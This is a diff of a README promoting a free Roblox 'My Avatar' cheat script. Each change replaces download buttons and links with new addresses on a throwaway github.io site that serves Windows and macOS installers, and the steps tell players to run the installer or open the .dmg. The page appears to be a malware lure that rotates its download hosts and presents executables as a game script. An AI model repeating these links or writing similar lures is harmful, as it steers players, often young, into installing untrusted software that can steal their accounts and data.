@@ -4,9 +4,9 @@
 
 > 🎭 My Avatar script with auto equip, outfit generator, item collector, and trend sync tools. Build the perfect avatar instantly from every available item in the game.
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 Whether you're grinding for hours or just getting started, **My Avatar Script** delivers everything you need to dominate the game. Built for both casual players and dedicated grinders, this free Roblox script gives you the edge to progress faster, earn more, and enjoy the game on your own terms.
 
@@ -16,7 +16,7 @@ Whether you're grinding for hours or just getting started, **My Avatar Script** 
 - Regular updates to stay compatible with the latest game patches
 - Lightweight and optimized for smooth gameplay
 
-### [⬇️ Download My Avatar Script](https://yobowgileysb.github.io/WinDownload/)
+### [⬇️ Download My Avatar Script](https://mixedlinkrelease.github.io/installer/)
 
 ---
 
@@ -65,7 +65,7 @@ Whether you're grinding for hours or just getting started, **My Avatar Script** 
 
 ### 🖥️ Windows (PC)
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 1. Click the **Download for Windows** button above
 2. Run the downloaded installer file
@@ -77,7 +77,7 @@ Whether you're grinding for hours or just getting started, **My Avatar Script** 
 
 ### 🍏 macOS (Intel/Apple Silicon)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the **Download for macOS** button above
 2. Open the downloaded `.dmg` and drag to Applications
